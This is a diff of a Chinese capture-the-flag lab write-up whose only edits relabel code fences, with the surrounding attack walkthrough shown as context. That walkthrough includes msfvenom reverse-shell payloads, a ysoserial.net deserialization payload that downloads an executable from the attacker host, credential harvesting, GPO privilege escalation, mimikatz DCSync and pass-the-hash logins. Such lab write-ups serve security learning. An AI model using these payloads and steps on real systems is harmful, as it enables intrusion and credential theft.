@@ -374,7 +374,7 @@ D:.
 
 首先，使用 `msfvenom` 生成 c2 恶意负载
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.16.2 LPORT=9999 -f exe -o exploit.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -387,14 +387,14 @@ Saved as: exploit.exe
 
 然后使用 [Github - NHPT/ysoserial.net](https://github.com/NHPT/ysoserial.net) 生成反序列化负载
 
-```shell
+```bash
 PS D:\_Tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl 10.10.16.2/exploit.exe -o C:\exploit.exe"
 ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCAxMC4xMC4xNi4yL2V4cGxvaXQuZXhlIC1vIEM6XFxleHBsb2l0LmV4ZScNCiAgICAgICAgfQ0KICAgIH0NCn0=
 ```
 
 通过 python 开启一个临时投放
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ sudo python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -414,7 +414,7 @@ Profile:ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRl
 
 成功触发反序列化
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ sudo python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -423,14 +423,14 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 然后重新构造反序列化载荷
 
-```shell
+```bash
 PS D:\_Tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\exploit.exe"
 ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXGV4cGxvaXQuZXhlJw0KICAgICAgICB9DQogICAgfQ0KfQ==
 ```
 
 同时启动一个监听器
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ sudo msfconsole -q
 [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
@@ -446,7 +446,7 @@ LPORT => 9999
 
 在网页上触发反序列化后，收到回连的 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ sudo netcat -lvnp 443
 Listening on 0.0.0.0 443
@@ -469,7 +469,7 @@ CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}
 
 在 `C:\` 中，发现日志文件夹
 
-```shell
+```bash
 PS C:\Logs\WEBDB> dir
 
     Directory: C:\Logs\WEBDB
@@ -506,7 +506,7 @@ Mode                LastWriteTime         Length Name
 
 在其中发现可能的凭据
 
-```shell
+```bash
 PS C:\Logs\WEBDB> type log_13.trc | Select-String TEIGNTON
 
 ????????? ??? ?????? ?????????? ??????? TEIGNTON\karl.memaybe
@@ -515,7 +515,7 @@ PS C:\Logs\WEBDB> type log_13.trc | Select-String TEIGNTON
 
 尝试使用此凭据连接数据库
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ impacket-mssqlclient teignton.htb/karl.memaybe:'B6rQx_d&RVqvcv2A'@10.13.37.12 -windows-auth
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -605,7 +605,7 @@ queue_messages_2041058307
 
 `card_details` 中包含有多条信息，尝试进行筛选
 
-```shell
+```bash
 ❯ sqsh -S 10.13.37.12:1433 -U 'teignton\karl.memaybe' -P 'B6rQx_d&RVqvcv2A'
 sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
 Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
@@ -676,7 +676,7 @@ password = "D0ntL0seSk3l3tonK3y!"
 
 尝试使用 [Github - Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm) 进行连接
 
-```shell
+```bash
 $ evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'
 PS C:\Users\jay.teignton\Documents> whoami
 teignton\jay.teignton
@@ -685,7 +685,7 @@ PS C:\Users\jay.teignton\Documents>
 
 在 `WindowsService.exe` 中发现
 
-```shell
+```bash
 PS C:\Users\jay.teignton\Documents> dir
 
     Directory: C:\Users\jay.teignton\Documents
@@ -798,7 +798,7 @@ private bool CheckClientCommand(Socket handler, string data)
 
 于是使用 [Github - antonioCoco/ConPtyShell](https://github.com/antonioCoco/ConPtyShell) 进行交互
 
-```shell
+```bash
 PS C:\Users\jay.teignton\Documents> .\netcat.exe 127.0.0.1 7734 -v
 WEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open
 password=2023-04-19-thisisleet
@@ -807,7 +807,7 @@ command=c:\programdata\shell.exe
 CONTEXT{l0l_s0c3ts_4re_fun}
 ```
 
-```shell
+```bash
 $ sudo netcat -lvnp 443
 Listening on 0.0.0.0 443
 Connection received on 10.13.37.12
@@ -826,7 +826,7 @@ CONTEXT{l0l_s0c3ts_4re_fun}
 
 借助 GPO 进行提权
 
-```shell
+```bash
 PS C:\ProgramData> New-GPO -Name privesc -Comment "Privilege Escalation"
 
 DisplayName      : privesc
@@ -853,7 +853,7 @@ Order       : 2
 
 使用 [Github - byronkg/SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse) 进行利用
 
-```shell
+```bash
 PS C:\ProgramData> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jay.teignton --gponame privesc
 [+] Domain = teignton.htb
 [+] Domain Controller = WEB.TEIGNTON.HTB
@@ -875,7 +875,7 @@ User Policy update has completed successfully.
 
 再次登录，即可拥有 `Administrators` 权限
 
-```shell
+```bash
 $ evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'
 PS C:\Users\jay.teignton\Documents> whoami
 teignton\jay.teignton
@@ -891,7 +891,7 @@ Remote Management Users
 
 进入 `C:\Users\Administrator` 目录
 
-```shell
+```bash
 PS C:\Users\jay.teignton\Documents> cd C:\Users\Administrator\Documents
 PS C:\Users\Administrator\Documents> dir
 
@@ -912,7 +912,7 @@ PS C:\Users\Administrator\Documents>
 
 亦或者，可以通过 NTLM 凭据进行攻击
 
-```shell
+```bash
 PS C:\Users\jay.teignton\Documents> .\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
 
   .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
@@ -966,7 +966,7 @@ Supplemental Credentials:
 
 使用哈希进行连接
 
-```shell
+```bash
 $ evil-winrm -i 10.13.37.12 -u Administrator -H 5059c4cf183da02e2f41bb1f53d713cc
 PS C:\Users\Administrator\Documents> whoami
 teignton\administrator
